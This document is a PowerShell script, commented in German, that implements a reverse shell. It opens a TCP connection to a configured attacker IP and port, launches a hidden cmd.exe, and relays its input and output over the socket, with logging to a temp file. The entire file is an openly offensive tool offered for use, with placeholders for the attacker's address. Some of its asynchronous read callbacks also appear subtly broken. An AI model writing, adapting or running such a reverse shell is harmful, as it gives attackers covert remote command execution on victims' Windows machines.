# PowerShell-only CMD Reverse Shell (ohne Installationen oder externe Tools)
# Dieses Skript verwendet nur integrierte Windows-Funktionen, um eine CMD-Reverse-Shell zu erstellen.

# --- KONFIGURATION START ---
$ip = "192.168.2.127"  # <--- HIER IHRE ANGREIFER-IP-ADRESSE EINGEBEN!
$port = 124           # <--- HIER IHREN LISTENER-PORT EINGEBEN!
$logFile = "$env:TEMP\revshell_log.txt" # Pfad zur Log-Datei im temporären Verzeichnis
# --- KONFIGURATION ENDE ---

# Hilfsfunktion zum Schreiben von Nachrichten in die Log-Datei
function Write-Log ($message) {
    try {
        Add-Content -Path $logFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $message"
    } catch {
        # Wenn selbst das Schreiben ins Log fehlschlägt, können wir hier nicht viel tun.
        # Dies könnte passieren, wenn der Pfad ungültig ist oder Berechtigungen fehlen.
    }
}

Write-Log "Script started. Attempting connection to $ip:$port."

try {
    # Erstelle ein TCP-Client-Objekt und verbinde dich mit dem Listener
    $client = New-Object System.Net.Sockets.TCPClient($ip,$port);
    Write-Log "Connection established."

    # Hole den Netzwerk-Stream für das Senden und Empfangen von Daten
    $stream = $client.GetStream();
    $sr = New-Object System.IO.StreamReader($stream); # Zum Lesen von Daten vom Listener
    $sw = New-Object System.IO.StreamWriter($stream); # Zum Schreiben von Daten zum Listener
    Write-Log "Streams created."

    # Starte den cmd.exe-Prozess
    $process = New-Object System.Diagnostics.Process;
    $process.StartInfo.FileName = "cmd.exe";
    $process.StartInfo.UseShellExecute = $false;     # Deaktiviert die Verwendung der Shell-Ausführung
    $process.StartInfo.RedirectStandardInput = $true;  # Leitet die Standardeingabe um
    $process.StartInfo.RedirectStandardOutput = $true; # Leitet die Standardausgabe um
    $process.StartInfo.RedirectStandardError = $true;  # Leitet die Standardfehlerausgabe um
    $process.StartInfo.CreateNoWindow = $true;       # Verhindert, dass ein CMD-Fenster sichtbar wird
    $process.Start();
    Write-Log "cmd.exe process started."

    # Hole die umgeleiteten Streams des cmd.exe-Prozesses
    $input_stream = $process.StandardInput;
    $output_stream = $process.StandardOutput;
    $error_stream = $process.StandardError;
    Write-Log "Process streams redirected."

    # Erstelle einen Puffer für das Lesen von Daten
    [byte[]]$buffer = 0..4095 | %{0}; # Puffer für 4KB Daten

    # Beginne, Ausgaben vom CMD-Prozess zum Netzwerk-Stream umzuleiten (Output)
    # Dies geschieht asynchron, um eine reibungslose Interaktion zu gewährleisten.
    $output_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, {
        param($ar)
        try {
            $read = $output_stream.BaseStream.EndRead($ar);
            if($read -gt 0) {
                $stream.Write($buffer, 0, $read);
                $stream.Flush();
                $output_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
            } else {
                Write-Log "Output stream read returned 0 bytes (likely end of stream)."
            }
        } catch {
            Write-Log "Error in output stream redirection: $($_.Exception.Message)"
            # Wenn ein Fehler auftritt, versuchen Sie, den Client zu schließen, um Schleife zu beenden.
            if($client.Connected) { $client.Close(); }
        }
    }, $null);

    # Mache dasselbe für die Fehlerausgabe
    $error_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, {
        param($ar)
        try {
            $read = $error_stream.BaseStream.EndRead($ar);
            if($read -gt 0) {
                $stream.Write($buffer, 0, $read);
                $stream.Flush();
                $error_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
            } else {
                Write-Log "Error stream read returned 0 bytes (likely end of stream)."
            }
        } catch {
            Write-Log "Error in error stream redirection: $($_.Exception.Message)"
            if($client.Connected) { $client.Close(); }
        }
    }, $null);

    Write-Log "Asynchronous reads started."

    # Hauptschleife: Lese Befehle vom Listener und sende sie an den CMD-Prozess
    while($client.Connected -and -not $process.HasExited) {
        try {
            # Überprüfen Sie, ob Daten vom Listener zum Lesen verfügbar sind, um Blockierung zu vermeiden
            if ($stream.DataAvailable) {
                $data = $sr.ReadLine(); # Lese eine Zeile vom Netzwerk-Stream (vom Listener)
                Write-Log "Received data: '$data'"
                if ($data -ne $null) { # Stelle sicher, dass die Zeile nicht null ist (bei Verbindungsverlust)
                    $input_stream.WriteLine($data); # Schreibe die gelesene Zeile in die Standardeingabe des CMD-Prozesses
                    $input_stream.Flush();
                }
            }
            Start-Sleep -Milliseconds 50 # Kurze Pause, um CPU-Auslastung zu reduzieren und andere Threads laufen zu lassen
        } catch {
            Write-Log "Error in main loop (client input): $($_.Exception.Message)"
            break; # Verbindung verloren oder anderer Fehler in der Schleife
        }
    }
    Write-Log "Main loop ended. Client connected: $($client.Connected), Process exited: $($process.HasExited)"

} catch {
    # Dieser Block fängt allgemeine Fehler vor dem Start der Hauptschleife ab
    Write-Log "CRITICAL SCRIPT ERROR: $($_.Exception.Message) - StackTrace: $($_.ScriptStackTrace)"
} finally {
    # Aufräumen: Schließe alle offenen Ressourcen, auch wenn ein Fehler auftritt
    Write-Log "Attempting cleanup."
    if($client.Connected) {
        try { $client.Close(); Write-Log "Client closed." } catch { Write-Log "Error closing client: $($_.Exception.Message)" }
    }
    if($process -and -not $process.HasExited) { # Sicherstellen, dass Prozess existiert, bevor Close aufgerufen wird
        try { $process.Close(); Write-Log "Process closed." } catch { Write-Log "Error closing process: $($_.Exception.Message)" }
    }
    Write-Log "Script finished."
}
